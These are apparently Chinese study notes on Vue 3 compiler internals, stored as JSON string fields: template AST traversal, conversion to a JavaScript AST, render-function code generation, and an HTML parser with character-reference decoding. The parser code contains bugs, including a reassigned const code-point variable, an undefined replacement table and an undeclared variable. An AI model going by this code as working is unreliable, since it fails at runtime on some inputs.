\"tagEnd\":\n        elementStack.pop();\n        break;\n    }\n    tokens.shift();\n  }\n\n  return root;\n}\n\n\n```\n\n> 这只是简单实现，没有考虑闭合的场景，可执行的代码见 `codes` 目录\n\n### 3.3. 完成流程示意图\n\n![图片&文件](./files/20241104-20.png)\n\n>  这就是**一个特定的打平一维数组结构构造成树形结构的算法问题**\n\n### 3.4. 如何有效的遍历 AST 树？（插件化架构）\n\n \n深度遍历如下 `AST 树`时\n\n```json\n{\n    \"type\": \"Root\",\n    \"children\": [\n        {\n            \"type\": \"Element\",\n            \"tag\": \"div\",\n            \"children\": [\n                {\n                    \"type\": \"Element\",\n                    \"tag\": \"p\",\n                    \"children\": [\n                        {\n                            \"type\": \"Text\",\n                            \"content\": \"Vue\"\n                        }\n                    ]\n                },\n                {\n                    \"type\": \"Element\",\n                    \"tag\": \"p\",\n                    \"children\": [\n                        {\n                            \"type\": \"Text\",\n                            \"content\": \"Template\"\n                        }\n                    ]\n                }\n            ]\n        }\n    ]\n}\n\n```\n \n 为了解耦节点的访问和操作，我们设计了`插件化架构`， 将节点的操作封装到`独立的转换函数`中。\n - 这些转换函数可以通过 `context.nodeTransforms` 来注册。\n - 这里的 `context` 称为转换`上下文`，上下文对象中通常会维护程序的当前状态，例如\n\t - 当前访问的节点\n\t - 当前访问的节点的父节点\n\t - 当前访问的节点的位置索引等信息。 \n\t - 有了上下文对象及其包含的重要信息后，\n\t - 这样我们即可轻松地实现节点的替换、删除等能力。\n - 遍历的`进入`和`离开`阶段\n\t - 有时，当前访问节点的转换工作依赖于其子节点的转换结果\n\t\t - 所以为了`优先`完成子节点的转换，我们将整个转换过程分为“`进入`阶段”与“`退出`阶段”\n\t - 每个转换函数都分两个阶段执行，这样就可以实现`更加细粒度`的转换控制\n\n#### 3.4.1. 具体代码，很好理解，就是一个`多叉树的遍历`而已\n\n关键点：\n- 前序位置，传入节点转换函数\n\t- 因为转换函数有个 `return` 值，所以这里也会收集相应的 return 的函数\n- 后续位置\n\t- 需要执行上面收集到的 `return` 函数\n\n```javascript hl:22\n\n// 转换函数 1 ：用于转换元素节点\nfunction transformElement(node) {\n  console.log(`进入：${JSON.stringify(node)}`);\n  return () => {\n    console.log(`退出：${JSON.stringify(node)}`);\n  };\n}\n// 转换函数 2 ：用于转换文本节点\nfunction transformText(node, context) {\n  console.log(`进入：${JSON.stringify(node)}`);\n\n  return () => {\n    console.log(`退出：${JSON.stringify(node)}`);\n  };\n}\n\n// 遍历节点，深度优先遍历，传入节点和上下文对象\nfunction traverseNode(ast, context) {\n  context.currentNode = ast;\n\n  // 遍历节点转换函数的 return 值, 用于退出时执行\n  const exitFns = [];\n  const transforms = context.nodeTransforms;\n  // ***************************** 前序位置  ***************************** \n  // 遍历节点转换函数, 传入当前节点和上下文对象,然后执行\n  for (let i = 0; i < transforms.length; i++) {\n    // 执行节点转换函数，返回一个函数，用于退出时执行\n    const onExit = transforms[i](context.currentNode, context);\n    if (onExit) {\n      exitFns.push(onExit);\n    }\n    if (!context.currentNode) return;\n  }\n\n  // 遍历子节点,递归遍历\n  const children = context.currentNode.children;\n  if (children) {\n    for (let i = 0; i < children.length; i++) {\n      // 记得更新上下文信息\n      context.parent = context.currentNode;\n      context.childIndex = i;\n      traverseNode(children[i], context);\n    }\n  }\n\n  // ***************************** 后续位置  ***************************** \n  // 退出时执行,走到这儿说明当前节点已经遍历完了\n  // 后序位置，这是离开节点时执行的函数\n  let i = exitFns.length;\n  while (i--) {\n    exitFns[i]();\n  }\n}\n\nfunction transform(ast) {\n  // 遍历的上下文对象，包括\n  // 当前节点父节点\n  // 当前节点在父节点中的索引\n  // 替换节点\n  // 删除节点\n  // 节点转换函数\n  const context = {\n    currentNode: null,\n    parent: null,\n    replaceNode(node) {\n      context.currentNode = node;\n      context.parent.children[context.childIndex] = node;\n    },\n    removeNode() {\n      if (context.parent) {\n        context.parent.children.splice(context.childIndex, 1);\n        context.currentNode = null;\n      }\n    },\n    // 插件的方式扩展功能\n    // 节点转换函数, 用于对节点进行转换\n    // 传入节点和上下文对象，\n    //  返回一个函数，用于在退出节点时执行\n    nodeTransforms: [transformElement, transformText],\n  };\n  // 调用 traverseNode 完成转换，传入 AST 和上下文对象\n  // 这是一个DFS递归遍历的过程\n  traverseNode(ast, context);\n  // 打印 AST 信息\n  console.log(dump(ast));\n}\n\nconst ast = parse(`<div><p>Vue</p><p>Template</p></div>`);\ntransform(ast);\n```\n\n#### 3.4.2. 附： Context(上下文) 的其他应用\n\n- 在编写 React 应用时\n\t- 我们可以使用 `React.createContext` 函数创建一个上下文对象，该上下文对象允许我们将数据通过组件 树一层层地传递下去。无论组件树的层级有多深，只要组件在这 棵组件树的层级内，那么它就能够访问上下文对象中的数据。\n- 在编写 Vue.js 应用时\n\t- 我们也可以通过 `provide/inject` 等能力，向一整棵组件树提供数据。这些数据可以称为上下文。 \n- 在编写 Koa 应用时\n\t- 中间件函数接收的 context 参数也是一种上 下文对象，所有中间件都可以通过 context 来访问相同的数据\n\n### 3.5. 将模板 AST 转换为用于描述渲染函数的 JavaScript AST\n\n#### 3.5.1. JavaScript AST 介绍\n\nJavaScript AST 用于描述 `JavaScript` 代码。只有把**模板 AST 转换为 JavaScript AST 后**，我们才能据此生成最终的渲染函数代码。\n\n```javascript\nfunction render() {\n  return h(\"div\", [h(\"p\", \"Vue\"), h(\"p\", \"Template\")]);\n}\n```\n\n 上面代码对应的 `js AST` 是什么呢？如下\n\n![图片&文件](./files/20241104-21.png)\n\n下面是具体结构\n\n```javascript\n// 最终生成的 jsAST\nconst jsAST = {\n  // 代表该节点是一个函数声明\n  type: \"FunctionDecl\",\n  // 标识符，本身也是一个节点，所以有自己的type和name属性\n  id: {\n    type: \"Identifier\",\n    name: \"render\", // 函数名\n  },\n  params: [], // 参数列表\n  body: [\n    // 函数体\n    {\n      type: \"ReturnStatement\", // 代表该节点是一个返回语句\n      return: {\n        type: \"CallExpression\",\n        callee: {\n          type: \"Identifier\",\n          name: \"h\",\n        },\n        arguments: [\n          {\n            type: \"StringLiteral\",\n            value: \"div\",\n          },\n          {\n            type: \"ArrayExpression\",\n            elements: [\n              {\n                type: \"CallExpression\",\n                callee: {\n                  type: \"Identifier\",\n                  name: \"h\",\n                },\n                arguments: [\n                  {\n                    type: \"StringLiteral\",\n                    value: \"p\",\n                  },\n                  {\n                    type: \"StringLiteral\",\n                    value: \"Vue\",\n                  },\n                ],\n              },\n              {\n                type: \"CallExpression\",\n                callee: {\n                  type: \"Identifier\",\n                  name: \"h\",\n                },\n                arguments: [\n                  {\n                    type: \"StringLiteral\",\n                    value: \"p\",\n                  },\n                  {\n                    type: \"StringLiteral\",\n                    value: \"Template\",\n                  },\n                ],\n              },\n            ],\n          },\n        ],\n      },\n    },\n  ],\n};\n```\n\n#### 3.5.2. 将模板 AST 转换 JS AST\n\n先写几个生成 JS AST 的辅助函数\n\n```javascript\n// 创建 AST 节点: StringLiteral 节点\nfunction createStringLiteral(value) {\n  return {\n    type: \"StringLiteral\",\n    value,\n  };\n}\n// 创建 AST 节点: Identifier  节点\nfunction createIdentifier(name) {\n  return {\n    type: \"Identifier\",\n    name,\n  };\n}\n// 创建 AST 节点: ArrayExpression  节点\nfunction createArrayExpression(elements) {\n  return {\n    type: \"ArrayExpression\",\n    elements,\n  };\n}\n// 创建 AST 节点: CallExpression 节点\nfunction createCallExpression(callee, arguments) {\n  return {\n    type: \"CallExpression\",\n    callee: createIdentifier(callee),\n    arguments,\n  };\n}\n```\n\n完整代码：\n\n```javascript\nfunction traverseNode(ast, context) {\n  context.currentNode = ast;\n\n  const exitFns = [];\n  const transforms = context.nodeTransforms;\n  for (let i = 0; i < transforms.length; i++) {\n    const onExit = transforms[i](context.currentNode, context);\n    if (onExit) {\n      exitFns.push(onExit);\n    }\n    if (!context.currentNode) return;\n  }\n\n  const children = context.currentNode.children;\n  if (children) {\n    for (let i = 0; i < children.length; i++) {\n      context.parent = context.currentNode;\n      context.childIndex = i;\n      traverseNode(children[i], context);\n    }\n  }\n\n  let i = exitFns.length;\n  while (i--) {\n    exitFns[i]();\n  }\n}\n\nfunction transform(ast) {\n  const context = {\n    currentNode: null,\n    parent: null,\n    replaceNode(node) {\n      context.currentNode = node;\n      context.parent.children[context.childIndex] = node;\n    },\n    removeNode() {\n      if (context.parent) {\n        context.parent.children.splice(context.childIndex, 1);\n        context.currentNode = null;\n      }\n    },\n    nodeTransforms: [transformRoot, transformElement, transformText],\n  };\n  // 调用 traverseNode 完成转换\n  traverseNode(ast, context);\n}\n\n// =============================== AST 工具函数 ===============================\n\n// 创建 AST 节点: StringLiteral 节点\nfunction createStringLiteral(value) {\n  return {\n    type: \"StringLiteral\",\n    value,\n  };\n}\n// 创建 AST 节点: Identifier  节点\nfunction createIdentifier(name) {\n  return {\n    type: \"Identifier\",\n    name,\n  };\n}\n// 创建 AST 节点: ArrayExpression  节点\nfunction createArrayExpression(elements) {\n  return {\n    type: \"ArrayExpression\",\n    elements,\n  };\n}\n// 创建 AST 节点: CallExpression 节点\nfunction createCallExpression(callee, arguments) {\n  return {\n    type: \"CallExpression\",\n    callee: createIdentifier(callee),\n    arguments,\n  };\n}\n\n// =============================== AST 工具函数 ===============================\n\n// 模板 AST 文本 转换 JS  StringLiteral 节点\nfunction transformText(node) {\n  if (node.type !== \"Text\") {\n    return;\n  }\n\n  node.jsNode = createStringLiteral(node.content);\n}\n\n// 模板 AST 元素 转换 JS  CallExpression 节点,因为要调用 h 函数\nfunction transformElement(node) {\n  return () => {\n    if (node.type !== \"Element\") {\n      return;\n    }\n\n    const callExp = createCallExpression(\"h\", [createStringLiteral(node.tag)]);\n    node.children.length === 1\n      ? callExp.arguments.push(node.children[0].jsNode)\n      : callExp.arguments.push(\n          createArrayExpression(node.children.map((c) => c.jsNode)),\n        );\n\n    node.jsNode = callExp;\n  };\n}\n\n// 模板 AST 根节点 转换 JS  FunctionDecl 节点\n// 根节点只有一个子节点，所以直接返回子节点的 jsNode\nfunction transformRoot(node) {\n  return () => {\n    if (node.type !== \"Root\") {\n      return;\n    }\n\n    const vnodeJSAST = node.children[0].jsNode;\n\n    node.jsNode = {\n      type: \"FunctionDecl\",\n      id: { type: \"Identifier\", name: \"render\" },\n      params: [],\n      body: [\n        {\n          type: \"ReturnStatement\",\n          return: vnodeJSAST,\n        },\n      ],\n    };\n  };\n}\n\nconst ast = parse(`<div><p>Vue</p><p>Template</p></div>`);\ntransform(ast);\n\nconsole.log(ast);\n```\n\n### 3.6. 渲染函数代码的生成\n\n代码生成的过程就是字符串拼接的过程。我们需要为不同的 AST 节点编写对应的代码生成函数。\n- 为了让生成的代码具有更强的可读性，我们可对生成的代码进行缩进和换行。\n\t- 我们将用于缩进和换行的代码封装为工具函数，并且定义到代码生成过程中的`上下文对象`中\n\n#### 3.6.1. 先看调用 generate 的效果\n\n```javascript\n// 最终生成的 jsAST\nconst jsAST = {\n  type: \"FunctionDecl\",\n  id: {\n    type: \"Identifier\",\n    name: \"render\",\n  },\n  params: [],\n  body: [\n    {\n      type: \"ReturnStatement\",\n      return: {\n        type: \"CallExpression\",\n        callee: {\n          type: \"Identifier\",\n          name: \"h\",\n        },\n        arguments: [\n          {\n            type: \"StringLiteral\",\n            value: \"div\",\n          },\n          {\n            type: \"ArrayExpression\",\n            elements: [\n              {\n                type: \"CallExpression\",\n                callee: {\n                  type: \"Identifier\",\n                  name: \"h\",\n                },\n                arguments: [\n                  {\n                    type: \"StringLiteral\",\n                    value: \"p\",\n                  },\n                  {\n                    type: \"StringLiteral\",\n                    value: \"Vue\",\n                  },\n                ],\n              },\n              {\n                type: \"CallExpression\",\n                callee: {\n                  type: \"Identifier\",\n                  name: \"h\",\n                },\n                arguments: [\n                  {\n                    type: \"StringLiteral\",\n                    value: \"p\",\n                  },\n                  {\n                    type: \"StringLiteral\",\n                    value: \"Template\",\n                  },\n                ],\n              },\n            ],\n          },\n        ],\n      },\n    },\n  ],\n};\n\nconsole.log(generate(jsAST));\n\n// function render () {\n//   return h('div', [h('p', 'Vue'), h('p', 'Template')])\n// }\n\n```\n\n#### 3.6.2. generate 的实现\n\n> 就是字符串的拼接工作，没有什么特别的\n\n```javascript\nfunction generate(node) {\n  const context = {\n    code: \"\",\n    push(code) {\n      context.code += code;\n    },\n    currentIndent: 0,\n    newline() {\n      context.code += \"\\n\" + `  `.repeat(context.currentIndent);\n    },\n    indent() {\n      context.currentIndent++;\n      context.newline();\n    },\n    deIndent() {\n      context.currentIndent--;\n      context.newline();\n    },\n  };\n\n  genNode(node, context);\n\n  return context.code;\n}\n\nfunction genNode(node, context) {\n  switch (node.type) {\n    case \"FunctionDecl\":\n      genFunctionDecl(node, context);\n      break;\n    case \"ReturnStatement\":\n      genReturnStatement(node, context);\n      break;\n    case \"CallExpression\":\n      genCallExpression(node, context);\n      break;\n    case \"StringLiteral\":\n      genStringLiteral(node, context);\n      break;\n    case \"ArrayExpression\":\n      genArrayExpression(node, context);\n      break;\n  }\n}\n\nfunction genFunctionDecl(node, context) {\n  const { push, indent, deIndent } = context;\n\n  push(`function ${node.id.name} `);\n  push(`(`);\n  genNodeList(node.params, context);\n  push(`) `);\n  push(`{`);\n  indent();\n\n  node.body.forEach((n) => genNode(n, context));\n\n  deIndent();\n  push(`}`);\n}\n\nfunction genNodeList(nodes, context) {\n  const { push } = context;\n  for (let i = 0; i < nodes.length; i++) {\n    const node = nodes[i];\n    genNode(node, context);\n    if (i < nodes.length - 1) {\n      push(\", \");\n    }\n  }\n}\n\nfunction genReturnStatement(node, context) {\n  const { push } = context;\n\n  push(`return `);\n  genNode(node.return, context);\n}\n\nfunction genCallExpression(node, context) {\n  const { push } = context;\n  const { callee, arguments: args } = node;\n  push(`${callee.name}(`);\n  genNodeList(args, context);\n  push(`)`);\n}\n\nfunction genStringLiteral(node, context) {\n  const { push } = context;\n\n  push(`'${node.value}'`);\n}\n\nfunction genArrayExpression(node, context) {\n  const { push } = context;\n  push(\"[\");\n  genNodeList(node.elements, context);\n  push(\"]\");\n}\n\n```\n\n### 3.7. 最后\n\n至此完成了基本的模板编译成渲染函数的工作\n\n","BIWQLZnZ":"\n# Vue3 的编译器原理（篇二：完善的 HTML 解析器）\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 完善的 HTML 解析器，📢📢 📢 注意需要参考 HTML 规范（WHATWG）\n- 使用正则能够让我写更少的代码\n\t- 其实正则表达式也是一种状态机\n\n## 1. 前言\n\n- 解析器本质上是一个状态机\n- 正则表达式其实也是一个状态机\n- 因此在编写 `parser` 的时候，利用正则表达式能够让我们少写不少代码\n\t- **本文我们将更多地利用正则表达式来实现 HTML 解析器。**\n- 另外，一个完善的 HTML 解析器远比想象的要复杂。 我们知道，**浏览器会对 HTML 文本进行解析**，那么它是如何做的呢? \n\t- 其实关于 HTML 文本的解析，是有规范可循的，即 WHATWG 关于 HTML 的解析规范，\n\t\t- 其中**定义了完整的错误处理和状态机的状态迁移流程**，还提及了一些**特殊的状态**，\n\t\t\t- 例如 DATA、CDATA、RCDATA、 RAWTEXT 等。\n\t\t\t- 那么，这些状态有什么含义呢\n\t\t\t- 它们对解析器有哪些影 响呢?什么是 HTML 实体\n\t\t\t- 以及 Vue.js 模板解析器需要如何处理 HTML 实体呢?\n\n## 2. 完善的 HTML 解析器\n\n```javascript\n// 定义文本模式，状态表\nconst TextModes = {\n  DATA: \"DATA\", // 普通文本模式\n  RCDATA: \"RCDATA\", // 解析字符数据模式\n  RAWTEXT: \"RAWTEXT\", // 原始文本模式\n  CDATA: \"CDATA\", // CDATA 模式\n};\n\n// 解析 Vue 模板, 返回 AST\n// 传入一个 vue 模板字符串，返回一个对象\nfunction parse(str) {\n  // 定义上下文对象\n  const context = {\n    source: str, // 模板内容\n    mode: TextModes.DATA, // 当前模式\n    // 前进指定长度的字符\n    advanceBy(num) {\n      context.source = context.source.slice(num); // 截取字符串，前进指定长度\n    },\n    // 跳过空白字符\n    advanceSpaces() {\n      const match = /^[\\t\\r\\n\\f ]+/.exec(context.source); // 匹配空白字符\n      if (match) {\n        context.advanceBy(match[0].length); // 前进匹配到的空白字符长度\n      }\n    },\n  };\n\n  // 第一个参数是上下文对象，\n  // 第二个参数是代表父节点构成的节点栈，初始为空数组\n  const nodes = parseChildren(context, []); // 解析子节点\n\n  return {\n    type: \"Root\", // 根节点类型\n    children: nodes, // 子节点\n  };\n}\n\n// 解析子节点\nfunction parseChildren(context, ancestors) {\n  let nodes = []; // 存储解析出的子节点\n\n  const { mode } = context; // 获取当前模式\n\n  // 循环解析，直到模板字符串结束或遇到结束标签\n  while (!isEnd(context, ancestors)) {\n    let node; // 当前解析出的节点\n\n    // 根据当前模式解析不同类型的节点\n    if (mode === TextModes.DATA || mode === TextModes.RCDATA) {\n      if (mode === TextModes.DATA && context.source[0] === \"<\") {\n        if (context.source[1] === \"!\") {\n          if (context.source.startsWith(\"<!--\")) {\n            // 解析注释\n            node = parseComment(context);\n          } else if (context.source.startsWith(\"<![CDATA[\")) {\n            // 解析 CDATA\n            node = parseCDATA(context, ancestors);\n          }\n        } else if (context.source[1] === \"/\") {\n          // 结束标签，不做处理\n        } else if (/[a-z]/i.test(context.source[1])) {\n          // 解析元素标签\n          node = parseElement(context, ancestors);\n        }\n      } else if (context.source.startsWith(\"{{\")) {\n        // 解析插值\n        node = parseInterpolation(context);\n      }\n    }\n\n    // 如果没有解析出节点，则解析为文本节点\n    if (!node) {\n      node = parseText(context);\n    }\n\n    nodes.push(node); // 将解析出的节点加入节点数组\n  }\n\n  return nodes; // 返回解析出的子节点数组\n}\n\n// 解析元素节点\nfunction parseElement(context, ancestors) {\n  // 解析开始标签\n  const element = parseTag(context);\n  if (element.isSelfClosing) return element; // 如果是自闭合标签，直接返回\n\n  // 将当前元素节点加入父节点栈\n  ancestors.push(element);\n\n  // 根据标签类型切换模式\n  if (element.tag === \"textarea\" || element.tag === \"title\") {\n    context.mode = TextModes.RCDATA;\n  } else if (/style|xmp|iframe|noembed|noframes|noscript/.test(element.tag)) {\n    context.mode = TextModes.RAWTEXT;\n  } else {\n    context.mode = TextModes.DATA;\n  }\n\n  // 解析子节点\n  element.children = parseChildren(context, ancestors);\n\n  // 从父节点栈中移除当前元素节点\n  ancestors.pop();\n\n  // 解析结束标签\n  if (context.source.startsWith(`</${element.tag}`)) {\n    parseTag(context, \"end\");\n  } else {\n    console.error(`${element.tag} 标签缺少闭合标签`);\n  }\n\n  return element; // 返回解析出的元素节点\n}\n\n// 解析标签\nfunction parseTag(context, type = \"start\") {\n  const { advanceBy, advanceSpaces } = context; // 获取上下文中的方法\n\n  // 匹配开始标签或结束标签\n  const match =\n    type === \"start\"\n      ? /^<([a-z][^\\t\\r\\n\\f />]*)/i.exec(context.source) // 匹配开始标签\n      : /^<\\/([a-z][^\\t\\r\\n\\f />]*)/i.exec(context.source); // 匹配结束标签\n  const tag = match[1]; // 获取标签名\n\n  // 前进到标签名之后\n  advanceBy(match[0].length);\n  advanceSpaces(); // 跳过空白字符\n\n  // 解析属性\n  const props = parseAttributes(context);\n\n  // 判断是否自闭合标签\n  const isSelfClosing = context.source.startsWith(\"/>\");\n  advanceBy(isSelfClosing ? 2 : 1); // 前进到标签结束符之后\n\n  return {\n    type: \"Element\", // 元素节点类型\n    tag, // 标签名\n    props, // 属性\n    children: [], // 子节点\n    isSelfClosing, // 是否自闭合\n  };\n}\n\n// 解析属性\nfunction parseAttributes(context) {\n  const { advanceBy, advanceSpaces } = context; // 获取上下文中的方法\n  const props = []; // 存储解析出的属性\n\n  // 循环解析属性，直到遇到标签结束符\n  while (!context.source.startsWith(\">\") && !context.source.startsWith(\"/>\")) {\n    const match = /^[^\\t\\r\\n\\f />][^\\t\\r\\n\\f />=]*/.exec(context.source); // 匹配属性名\n    const name = match[0]; // 获取属性名\n\n    advanceBy(name.length); // 前进到属性名之后\n    advanceSpaces(); // 跳过空白字符\n    advanceBy(1); // 跳过等号\n    advanceSpaces(); // 跳过空白字符\n\n    let value = \"\"; // 属性值\n\n    // 判断属性值是否被引号包裹\n    const quote = context.source[0];\n    const isQuoted = quote === '\"' || quote === \"'\";\n    if (isQuoted) {\n      advanceBy(1); // 跳过引号\n      const endQuoteIndex = context.source.indexOf(quote); // 查找引号结束位置\n      if (endQuoteIndex > -1) {\n        value = context.source.slice(0, endQuoteIndex); // 获取属性值\n        advanceBy(value.length); // 前进到属性值之后\n        advanceBy(1); // 跳过引号\n      } else {\n        console.error(\"缺少引号\");\n      }\n    } else {\n      const match = /^[^\\t\\r\\n\\f >]+/.exec(context.source); // 匹配未被引号包裹的属性值\n      value = match[0]; // 获取属性值\n      advanceBy(value.length); // 前进到属性值之后\n    }\n\n    advanceSpaces(); // 跳过空白字符\n\n    props.push({\n      type: \"Attribute\", // 属性节点类型\n      name, // 属性名\n      value, // 属性值\n    });\n  }\n\n  return props; // 返回解析出的属性数组\n}\n\n// 解析文本节点\nfunction parseText(context) {\n  let endIndex = context.source.length; // 文本节点结束位置\n  const ltIndex = context.source.indexOf(\"<\"); // 查找下一个标签的起始位置\n  const delimiterIndex = context.source.indexOf(\"{{\"); // 查找下一个插值的起始位置\n\n  // 找到最近的标签或插值的起始位置\n  if (ltIndex > -1 && ltIndex < endIndex) {\n    endIndex = ltIndex;\n  }\n  if (delimiterIndex > -1 && delimiterIndex < endIndex) {\n    endIndex = delimiterIndex;\n  }\n\n  const content = context.source.slice(0, endIndex); // 获取文本内容\n\n  context.advanceBy(content.length); // 前进到文本内容之后\n\n  return {\n    type: \"Text\", // 文本节点类型\n    content: decodeHtml(content), // 解码后的文本内容\n  };\n}\n\n// 判断是否解析结束\nfunction isEnd(context, ancestors) {\n  if (!context.source) return true; // 如果模板字符串为空，则解析结束\n\n  // 与节点栈内全部的节点比较，判断是否遇到结束标签\n  for (let i = ancestors.length - 1; i >= 0; --i) {\n    if (context.source.startsWith(`</${ancestors[i].tag}`)) {\n      return true; // 如果遇到结束标签，则解析结束\n    }\n  }\n}\n\n// 命名字符引用表\nconst namedCharacterReferences = {\n  gt: \">\",\n  \"gt;\": \">\",\n  lt: \"<\",\n  \"lt;\": \"<\",\n  \"ltcc;\": \"⪦\",\n};\n\n// 解码 HTML 字符引用\nfunction decodeHtml(rawText, asAttr = false) {\n  let offset = 0; // 当前偏移量\n  const end = rawText.length; // 文本结束位置\n  let decodedText = \"\"; // 解码后的文本\n  let maxCRNameLength = 0; // 最大字符引用名称长度\n\n  function advance(length) {\n    offset += length; // 增加偏移量\n    rawText = rawText.slice(length); // 截取字符串\n  }\n\n  while (offset < end) {\n    const head = /&(?:#x?)?/i.exec(rawText); // 匹配字符引用的起始位置\n    if (!head) {\n      const remaining = end - offset; // 剩余未处理的文本长度\n      decodedText += rawText.slice(0, remaining); // 追加剩余文本\n      advance(remaining); // 前进到文本结束\n      break;\n    }\n    // 前进到字符引用的起始位置\n    decodedText += rawText.slice(0, head.index); // 追加字符引用前的文本\n    advance(head.index); // 前进到字符引用起始位置\n\n    if (head[0] === \"&\") {\n      // 命名字符引用\n      let name = \"\"; // 字符引用名称\n      let value; // 字符引用值\n      if (/[0-9a-z]/i.test(rawText[1])) {\n        if (!maxCRNameLength) {\n          maxCRNameLength = Object.keys(namedCharacterReferences).reduce(\n            (max, name) => Math.max(max, name.length),\n            0,\n          ); // 计算最大字符引用名称长度\n        }\n        for (let length = maxCRNameLength; !value && length > 0; --length) {\n          name = rawText.substr(1, length); // 获取字符引用名称\n          value = namedCharacterReferences[name]; // 获取字符引用值\n        }\n        if (value) {\n          const semi = name.endsWith(\";\"); // 判断字符引用是否以分号结尾\n          if (\n            asAttr &&\n            !semi &&\n            /[=a-z0-9]/i.test(rawText[name.length + 1] || \"\")\n          ) {\n            decodedText += \"&\" + name; // 追加字符引用\n            advance(1 + name.length); // 前进到字符引用之后\n          } else {\n            decodedText += value; // 追加解码后的字符引用值\n            advance(1 + name.length); // 前进到字符引用之后\n          }\n        } else {\n          decodedText += \"&\" + name; // 追加字符引用\n          advance(1 + name.length); // 前进到字符引用之后\n        }\n      } else {\n        decodedText += \"&\"; // 追加字符引用\n        advance(1); // 前进到字符引用之后\n      }\n    } else {\n      // 判断是十进制表示还是十六进制表示\n      const hex = head[0] === \"&#x\";\n      // 根据不同进制表示法，选用不同的正则\n      const pattern = hex ? /^&#x([0-9a-f]+);?/i : /^&#([0-9]+);?/;\n      // 最终，body[1] 的值就是 Unicode 码点\n      const body = pattern.exec(rawText);\n\n      // 如果匹配成功，则调用 String.fromCodePoint 函数进行解码\n      if (body) {\n        // 将码点字符串转为十进制数字\n        const cp = Number.parseInt(body[1], hex ? 16 : 10);\n        // 码点的合法性检查\n        if (cp === 0) {\n          // 如果码点值为 0x00，替换为 0xfffd\n          cp = 0xfffd;\n        } else if (cp > 0x10ffff) {\n          // 如果码点值超过了 Unicode 的最大值，替换为 0xfffd\n          cp = 0xfffd;\n        } else if (cp >= 0xd800 && cp <= 0xdfff) {\n          // 如果码点值处于 surrogate pair 范围，替换为 0xfffd\n          cp = 0xfffd;\n        } else if ((cp >= 0xfdd0 && cp <= 0xfdef) || (cp & 0xfffe) === 0xfffe) {\n          // 如果码点值处于 `noncharacter` 范围，则什么都不做，交给平台处理\n          // noop\n        } else if (\n          // 控制字符集的范围是：[0x01, 0x1f] 加上 [0x7f, 0x9f]\n          // 却掉 ASICC 空白符：0x09(TAB)、0x0A(LF)、0x0C(FF)\n          // 0x0D(CR) 虽然也是 ASICC 空白符，但需要包含\n          (cp >= 0x01 && cp <= 0x08) ||\n          cp === 0x0b ||\n          (cp >= 0x0d && cp <= 0x1f) ||\n          (cp >= 0x7f && cp <= 0x9f)\n        ) {\n          // 在 CCR_REPLACEMENTS 表中查找替换码点，如果找不到则使用原码点\n          cp = CCR_REPLACEMENTS[cp] || cp;\n        }\n        // 解码后追加到 decodedText 上\n        decodedText += String.fromCodePoint(cp);\n        // 消费掉整个数字字符引用的内容\n        advance(body[0].length);\n      } else {\n        // 如果没有匹配，则不进行解码操作，只是把 head[0] 追加到 decodedText 并消费掉\n        decodedText += head[0];\n        advance(head[0].length);\n      }\n    }\n  }\n  return decodedText; // 返回解码后的文本\n}\n\n// 解析插值\nfunction parseInterpolation(context) {\n  context.advanceBy(\"{{\".length); // 前进到插值起始位置\n  closeIndex = context.source.indexOf(\"}}\"); // 查找插值结束位置\n  const content = context.source.slice(0, closeIndex); // 获取插值内容\n  context.advanceBy(content.length); // 前进到插值内容之后\n  context.advanceBy(\"}}\".length); // 前进到插值结束位置\n\n  return {\n    type: \"Interpolation\", // 插值节点类型\n    content: {\n      type: \"Expression\", // 表达式节点类型\n      content: decodeHtml(content), // 解码后的表达式内容\n    },\n  };\n}\n\n// 解析注释\nfunction parseComment(context) {\n  context.advanceBy(\"<!--\".length); // 前进到注释起始位置\n  closeIndex = context.source.indexOf(\"-->\"); // 查找注释结束位置\n  const content = context.source.slice(0, closeIndex); // 获取注释内容\n  context.advanceBy(content.length); // 前进到注释内容之后\n  context.advanceBy(\"-->\".length); // 前进到注释结束位置\n\n  return {\n    type: \"Comment\", // 注释节点类型\n    content, // 注释内容\n  };\n}\n\n\n\n```\n\n## 3. 执行结果测试\n\n```js\n// 测试解析函数\nconst s = `<div><!-- comments --></div>`;\nconst ast = parse(s); // 解析模板字符串\nconsole.log(ast); // 输出解析结果\n\n{\n    \"type\": \"Root\",\n    \"children\": [\n        {\n            \"type\": \"Element\",\n            \"tag\": \"div\",\n            \"props\": [],\n            \"children\": [\n                {\n                    \"type\": \"Comment\",\n                    \"content\": \" comments \"\n                }\n            ],\n            \"isSelfClosing\": false\n        }\n    ]\n}\n```\n\n## 4. 更多\n\n> 细节需要再慢慢看看书中的内容吧，不需要每行每字的看了，别浪费时间，以后需要直接来看调试这个代码，或者看书，或者借助其他工具都行\n\n","bNuj6RWU":"\n# Vue3 基础：篇二\n\n\n `#vue3` `#前端框架/vue` \n\n\n## 目录\n<!-- toc -->\n ## 1. 几个关键词 \n\n### 1.1. Vue 的两个核心功能\n\n- `声明式渲染`：\n\t- Vue 基于标准 HTML 拓展了一套模板语法，使得我们可以声明式地描述最终输出的 HTML 和 JavaScript 状态之间的关系。\n- 响应性：\n\t- Vue 会自动跟踪 JavaScript 状态并在其发生变化时响应式地更新 DOM。\n\n### 1.2. 单文件组件\n\n- `单文件组件` (也被称为 `*.vue` 文件，英文 Single-File Components，缩写为 SFC)\n\t- 顾名思义，Vue 的单文件组件会将一个组件的逻辑 (JavaScript)，模板 (HTML) 和样式 (CSS) 封装在同一个文件里\n\n### 1.3. API 风格\n\nVue 的组件可以按两种不同的风格书写：选项式 API 和 组合式 API。\n\n#### 1.3.1. 选项式 API (Options API)\n\n即`vue2`的写法\n\n#### 1.3.2. 组合式 API (Composition API)\n\n即新的`vue3`的写法\n\n### 1.4. ONLINE DEMO\n\n> 很重要，重要功能或者feature 可以直接在线体验\n\n- 想要快速体验 Vue，你可以直接试试我们的 [演练场](https://sfc.vuejs.org/#eNo9j01qAzEMha+iapMWOjbdDm6gu96gG2/cjJJM8B+2nBaGuXvlpBMwtj4/JL234EfO6toIRzT1UObMexvpN6fCMNHRNc+w2AgwOXbPL/caoBC3EjcCCPU0wu6TvE/wlYqfnnZ3ae2PXHKMfiwQYArZOyYhAHN+2y9LnwLrarTQ7XeOuTFch5Am8u8WRbcoktGPbnzFOXS3Q3BZXWqKkuRmy/4L1eK4GbUoUTtbPDPnOmpdj4ee/1JVKictlSot8hxIUQ3Dd0k/lYoMtrglwfUPkXdoJg==)。\n- 如果你更喜欢不用任何构建的原始 HTML，可以使用 [JSFiddle](https://jsfiddle.net/yyx990803/2ke1ab0z/) 入门。\n- 